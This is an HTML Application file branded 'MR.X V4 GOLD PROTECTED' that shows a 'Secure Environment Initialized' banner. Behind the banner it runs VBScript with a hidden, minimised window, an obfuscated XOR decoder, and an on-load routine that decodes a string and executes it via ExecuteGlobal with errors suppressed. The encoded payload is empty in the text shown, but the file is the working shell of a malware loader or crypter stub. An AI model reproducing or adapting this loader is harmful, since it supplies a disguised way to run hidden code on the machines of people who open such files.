<!DOCTYPE html>
<html>
<head>
    <title>MR.X V4 GOLD PROTECTED</title>
    <hta:application id="oHTA" showintaskbar="no" windowstate="minimize" scroll="no" contextmenu="no" selection="no" />
    <script language="vbs">
        Function grfwDPHB(cmCmgrLE, raxfpzdd)
            Dim pwXgfQpA, deHekuMC, hvpDvUti, NXcKHUIW
            pwXgfQpA = ""
            NXcKHUIW = Len(raxfpzdd)
            For deHekuMC = 1 To Len(cmCmgrLE) Step 2
                hvpDvUti = CByte("&H" & Mid(cmCmgrLE, deHekuMC, 2))
                pwXgfQpA = pwXgfQpA & Chr(hvpDvUti Xor Asc(Mid(raxfpzdd, ((deHekuMC - 1) / 2 Mod NXcKHUIW) + 1, 1)))
            Next
            grfwDPHB = pwXgfQpA
        End Function
        Sub Window_OnLoad
            On Error Resume Next
            Dim h, k, d
            h = ""
            k = "ImQGCncnwChMycbn"
            d = grfwDPHB(h, k)
            ExecuteGlobal d
            document.open : document.write d : document.close
        End Sub
    </script>
</head>
<body style="background-color:black; color:#d4af37; font-family:Consolas; text-align:center;">
    <h2 style="color:#d4af37;">MR.X V4 GOLD</h2>
    <p>Secure Environment Initialized.</p>
</body>
</html>